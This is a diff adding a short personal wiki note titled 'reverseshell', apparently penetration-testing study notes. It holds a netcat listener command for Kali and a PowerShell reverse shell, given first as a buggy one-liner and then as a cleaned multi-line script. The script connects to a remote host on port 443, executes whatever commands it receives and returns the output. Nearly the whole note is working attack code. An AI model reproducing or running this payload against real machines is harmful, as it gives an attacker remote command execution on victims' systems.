@@ -1,0 +1,43 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-19T13:17:54-04:00
+
+====== reverseshell ======
+Created Tuesday 19 May 2020
+
+====== on kali :: ======
+
+.sudo nc -lnvp 443
+
+
+====== on windows powersell ======
+
+
+powershell -c "
+$client =New-Object System.Net.Sockets.TCPCLient('10.11.0.4',443); $client.GetStream(); [byte[]]$bytes=0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0) {
+$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS' + (pwd).Path + '>' ; $sendbyte=([text.encoding]::ASCII).getBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush();}$clinet.Close();
+
+
+"
+
+
+
+
+
+
+
+here's clea above code; 
+
+$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{
+$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+$sendback = (iex $data 2>&1 | Out-String );
+$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+$stream.Write($sendbyte,0,$sendbyte.Length);
+$stream.Flush();
+}
+$client.Close();
